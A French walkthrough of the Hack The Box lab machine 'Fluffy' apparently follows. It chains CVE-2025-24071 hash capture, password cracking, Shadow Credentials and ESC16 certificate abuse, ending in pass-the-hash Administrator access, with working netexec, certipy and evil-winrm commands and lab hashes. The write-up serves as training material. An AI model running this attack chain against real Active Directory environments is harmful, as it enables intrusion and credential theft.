# Fluffy


![Fluffy](/images/Fluffy/fluffy.png)

Fluffy est une machine Windows Active Directory de type `assume-breach`. Nous avons donc les identifiants `j.fleischman:J0elTHEM4n1990!`. Je commencerai par exploiter les vulnérabilités `CVE-2025-24071`, liées à la façon dont Windows gère les fichiers `library-ms` dans des archives zip, ce qui provoque des tentatives d’authentification vers l’attaquant. J’obtiendrai un NetNTLMv2 et le craquerai. Ensuite, les données `BloodHound` montrent que cet utilisateur dispose du droit `GenericWrite` sur certains comptes de service. J’abuserai de cela pour obtenir un shell `WinRM` avec l’un d’eux. À partir de cet utilisateur, j’exploiterai `ESC16` dans l’environnement `ADCS` pour obtenir un shell en tant qu’Administrateur.

## Énumération

### Nmap

Le scan révèle plusieurs ports ouverts : DNS (tcp 53), Kerberos (tcp 88), SMB(tcp 445), LDAP (389), WINRM (5985) ainsi que d’autres ports Windows.

```bash
nmap 10.129.95.254 --min-rate 5000 -p-
```

```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49685/tcp open  unknown
49698/tcp open  unknown
49712/tcp open  unknown
```

Maintenant un scan en profondeur pour avoir plus de détails.

```bash
nmap 10.129.95.254 --min-rate 5000 -sV -sC -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49685,49698,49712
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 03:16:04Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T03:17:39+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T03:17:39+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-05-25T03:17:39+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T03:17:39+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2025-05-25T03:17:05
|_  start_date: N/A

```

J’ajoute le nom de domaine ainsi que le FQDN dans le fichier **`/etc/hosts`**.

```bash
echo "10.129.210.200 DC01.fluffy.htb fluffy.htb DC01" | sudo tee -a /etc/hosts
```

### SMB (445)

Avec `netexec`, j’énumère les utilisateurs du domaine.

```bash
nxc smb 10.129.95.254 -u j.fleischman -p 'J0elTHEM4n1990!' --users
```

![image.png](/images/Fluffy/image.png)

Puis avec les identifiants fournis, j’énumère les partages. Je vois alors que j’ai un accès en lecture et en écriture au partage **`IT`**.

```bash
nxc smb 10.129.95.254 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

![image.png](/images/Fluffy/image1.png)

J’accède au partage en utilisant `smbclient`, puis je télécharge le contenu du partage `IT`.

```bash
smbclient -U j.fleischman //dc01.fluffy.htb/IT
```

![image.png](/images/Fluffy/image2.png)

## Connexion en tant que p.agila

Le fichier PDF téléchargé contient une liste de CVE dont la `CVE-2025-24071` qui est vraiment intéressante pour la suite.

![image.png](/images/Fluffy/image3.png)

Avant de continuer avec cette CVE, j’utilise l’option `—bloodhound` de `netexec` pour récupérer les relations entre les objets du domaine.

```bash
nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound -c all --dns-server 10.129.95.254
```

![image.png](/images/Fluffy/image4.png)

### CVE-2025-24071

Parmi toutes les CVE, la [CVE-2025-24071](https://www.cvedetails.com/cve/CVE-2025-24071/) est intéressante.

Cette vulnérabilité a un score CVSS de 7.5, ce qui indique sa gravité. Le problème provient de la confiance implicite et de l'analyse automatique des fichiers `.library-ms` dans l'Explorateur Windows. Un attaquant non authentifié peut exploiter cette vulnérabilité en créant des fichiers RAR/ZIP contenant un chemin SMB malveillant. Je trouve alors un [POC](https://github.com/0x6rss/CVE-2025-24071_PoC).

![image.png](/images/Fluffy/image5.png)

Ensuite je lance `responder`.

![image.png](/images/Fluffy/image6.png)

Puis j’uploade l’archive malveillante dans le partage `IT`.

![image.png](/images/Fluffy/image7.png)

Après quelques secondes d’attente, l’utilisateur **`p.agila`**extrait le contenu de l’archive, ce qui permet de récupérer son hash NTLM.

![image.png](/images/Fluffy/image8.png)

Je craque alors le hash **`john`**  et j’obtiens le mot de passe **`prometheusx-303` .**

![image.png](/images/Fluffy/image9.png)

Après vérification, les identifiants sont valides.

```bash
User : p.agila
Password : prometheusx-303
```

![image.png](/images/Fluffy/image10.png)

## Shell as winrm_svc

### GenericAll

Sur `bloodhound`, je constate que `p.agila` est membre du groupe  `Service Account Managers` . Ce groupe dispose des privilèges  `GenericAll`  sur le groupe  `Service Accounts`.

![image.png](/images/Fluffy/image11.png)

J’ajoute `p.agila` au groupe `Service Account`. Je que ce groupe contient d’autres utilisateurs (des comptes de services). En plus p.agile possède les droit `GenericWrite` sur ces comptes de services. Je peux donc tester du `Shadow Credentials` afin d’obtenir leur hash NTLM.

```bash
net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

![image.png](/images/Fluffy/image12.png)

### Shadow Credentials

Avec **`faketime`** je synchronise le temps entre ma machine et le DC.

```bash
faketime "$(rdate -n 10.129.210.200 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

![image.png](/images/Fluffy/image13.png)

Je peux maintenant obtenir les hash des utilisateurs `winrm_svc`, `ldap_svc` et `ca_svc`.

```bash
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.156.28 -account 'winrm_svc'
```

![image.png](/images/Fluffy/image14.png)

```bash
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.156.28 -account 'ldap_svc'
```

![image.png](/images/Fluffy/image15.png)

```bash
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.156.28 -account 'ca_svc'
```

![image.png](/images/Fluffy/image16.png)

### Evil-WinRM

Je me connecte en tant que **`winrm_svc`.**

```bash
evil-winrm -i 10.129.156.28 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
```

![image.png](/images/Fluffy/image17.png)

## Shell as administrator

### ESC16

Il existe une autorité de certification nommée `fluffy-DC01-CA`.

```bash
certipy find -u 'ca_svc@fluffly.htb' -hashes :'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.210.200 -vulnerable
```

![image.png](/images/Fluffy/image18.png)

Il y a le template `User` qui est vulnérable à une `ESC16`.

![image.png](/images/Fluffy/image19.png)

Pour l’exploiter, j’ai utiliser [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) comme référence.

Premièrement je change le **`UserPrincipalName`** de **`ca_svc`** pour **`administrator`**.

```bash
certipy account update -username "p.agila@fluffy.htb" -p 'prometheusx-303' -user 'ca_svc' -upn 'administrator'
```

![image.png](/images/Fluffy/image20.png)

Maintenant le certificat peut être demandé en tant que **`ca_svc`** mais avec le UPN de l’administrateur.

```bash
certipy req -username "ca_svc@fluffy.htb" -hashes :"ca0f4f9e9eb8a092addf53bb03fc98c8" -target "dc01.fluffy.htb" -ca 'fluffy-DC01-CA' -template 'User' -debug
```

![image.png](/images/Fluffy/image21.png)

Je remplace ensuite le `UserPrincipalName` de `ca_svc` par sa valeur initiale.

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user 'ca_svc' -upn "ca_svc@fluffy.htb"
```

![image.png](/images/Fluffy/image22.png)

Maintenant, je m’authentifie avec le certificat obtenu et il a fourni le hash NT de l'administrateur.

```bash
certipy auth -pfx 'administrator.pfx' -domain "fluffy.htb"
```

![image.png](/images/Fluffy/image23.png)

### Evil-WinRM

Les identifiants étant valides je me connecte en tant que l’utilisateur **`administrator`**.

```bash
evil-winrm -i 10.129.210.200 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
```

![image.png](/images/Fluffy/image24.png)

